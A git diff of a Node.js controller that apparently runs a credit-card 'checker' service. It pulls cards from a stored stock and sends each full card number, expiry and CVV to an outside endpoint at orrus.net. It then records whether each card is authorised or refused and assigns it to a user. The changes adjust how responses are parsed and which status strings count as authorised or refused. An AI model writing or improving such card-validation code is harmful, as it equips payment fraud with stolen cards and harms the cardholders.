@@ -22,21 +22,28 @@ class TesteController {
 		}
 
 		var funcs = [];
-
+		var count = null;
 		for (let index = 0; index < ammount; index++) {
 			funcs.push(this.efetuaTeste);
 			await new Promise((resolve, reject) =>
 				this.efetuaTeste(user, null, resolve, reject)
-			).catch(() => {
-				return res.status(400).json({
-					message: "Teste finalizado por falta de cartão no estoque."
-				});
-			});
-		}
+			)
+				.then(() => {
+					if (count === ammount) {
+						return res.json({
+							message: "Teste finalizado com sucesso !"
+						});
+					}
 
-		return res.json({
-			message: "Teste finalizado com sucesso !"
-		});
+					count = count + 1;
+				})
+				.catch(() => {
+					return res.status(400).json({
+						message:
+							"Teste finalizado por falta de cartão no estoque."
+					});
+				});
+		}
 	}
 
 	async efetuaTeste(user, ccNumber, resolve, reject) {
@@ -65,20 +72,22 @@ class TesteController {
 			method: "get",
 			url: `http://orrus.net/b0yBase/api.php?orrus=${cc.number}|${cc.month}|${cc.year}|${cc.cvv}`
 		});
+		// console.log(resultTest.data.Retorno);
+		var result = resultTest.data.Retorno;
 
-		var result = "Pendente";
-
-		if (resultTest.data.includes("Retorno")) {
-			result = resultTest.data.replace(`{"Retorno":"`, "");
-			result = result.replace(`"}`, "");
-		} else {
-			result = "Invalida";
-		}
+		// if (resultTest.data.includes("Retorno")) {
+		// 	result = resultTest.data.replace(`{"Retorno":"`, "");
+		// 	result = result.replace(`"}`, "");
+		// } else {
+		// 	result = "Invalida";
+		// }
 
 		result = result.trim();
 
+		console.log(result);
+
 		switch (result) {
-			case "Autorizada": {
+			case "Autorizado": {
 				await User.update(
 					{ _id: user.id },
 					{
@@ -98,7 +107,7 @@ class TesteController {
 				break;
 			}
 
-			case "Nao autorizada": {
+			case "Nao autorizado": {
 				await Product.findByIdAndUpdate(cc.id, {
 					status: "Recusada",
 					usedBy: user.id,
